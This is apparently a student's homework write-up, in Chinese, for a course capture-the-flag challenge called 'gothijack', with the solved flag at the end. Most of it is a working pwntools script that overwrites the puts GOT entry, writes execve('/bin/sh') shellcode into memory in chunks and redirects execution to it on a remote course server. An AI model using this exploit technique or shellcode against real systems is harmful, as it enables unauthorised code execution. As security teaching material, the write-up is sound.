# Software Security Hw02

本題的main funtion執行時可以複寫一個記憶體位置
前面username以及target_address的空間大小都不夠我塞入shellcode(37byte)

於是我決定先複寫最後puts的got回到main，讓我有辦法一直對記憶體位置作寫入, 最後在複寫puts的got到shellcode的起始位置

以下為我的script

```python
#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10129)
# r = process('./gothijack')

shellcode = ['\x48\xc7\xc0\x3b\x00\x00\x00\x48',
             '\xbb\x2f\x62\x69\x6e\x2f\x73\x68',
             '\x00\x53\x48\x89\xe7\x48\xc7\xc6',
             '\x00\x00\x00\x00\x48\xc7\xc2\x00', 
             '\x00\x00\x00\x0f\x05']

name = 'Andy'
start = 0x601100
puts_got = 0x601020
main = 0x40090e


r.send(name)
sleep(0.5)
r.send(hex(puts_got))
sleep(0.5)
r.send(p64(main))
sleep(0.5)

for i in range(0,5):
    r.send(name)
    sleep(0.5)
    r.send( hex(start + i*0x8) )
    sleep(0.5)
    r.send(shellcode[i])
    sleep(0.5)

r.send(name)
sleep(0.5)
r.send(hex(puts_got))
sleep(0.5)
r.send(p64(start))
sleep(0.5)

r.recv()
r.interactive()

```

```
FLAG{G0THiJJack1NG}
附註: 解題完之後上網搜尋一下原來有27byte的Shellcode...多繞了不少圈。
```
